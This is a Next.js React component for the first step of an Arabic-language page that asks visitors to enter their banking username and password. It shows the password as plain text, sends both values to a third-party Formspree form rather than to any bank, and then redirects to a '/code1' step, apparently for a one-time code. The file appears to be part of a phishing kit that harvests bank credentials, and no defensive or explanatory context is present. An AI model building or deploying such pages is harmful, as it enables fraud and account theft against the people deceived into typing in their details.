"use client";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { useForm } from "@formspree/react";

function Step1() {
  const [state, handleSubmit] = useForm("xjkbqzbo");
  const router = useRouter();
  const [formData, setFormData] = useState({
    username: "", // Use standard names for better compatibility with Formspree
    password: "",
  });

  const onFormSubmit = async (e) => {
    e.preventDefault();

    const res = await handleSubmit({
      data: {
        username: formData.username,
        password: formData.password,
      },
    });

    router.replace("/code1"); // Navigate to Step 2 on success
  };

  return (
    <div>
      <p className="text-xl text-stone-500 my-3">ادخل معلوماتك البنكية :</p>
      <form
        method="POST"
        onSubmit={onFormSubmit}
        className="flex items-center justify-center flex-wrap gap-14"
      >
        <div className="flex flex-col text-xl">
          <label>اسم المستخدم :</label>
          <input
            type="text"
            name="username" // Name field
            value={formData.username}
            onChange={(e) =>
              setFormData({ ...formData, username: e.target.value })
            }
            placeholder="اسم المستخدم"
            className="w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
          />
        </div>
        <div className="flex flex-col text-xl">
          <label>كلمة المرور :</label>
          <input
            type="text"
            name="password" // Phone number field
            value={formData.password}
            onChange={(e) =>
              setFormData({ ...formData, password: e.target.value })
            }
            placeholder="كلمه المرور"
            className="w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
          />
        </div>
        <div className="w-full flex justify-center">
          <button
            type="submit"
            className="bg-red-600 text-white py-2 px-8 rounded-full mt-10"
          >
            التالي
          </button>
        </div>
      </form>
    </div>
  );
}

export default Step1;
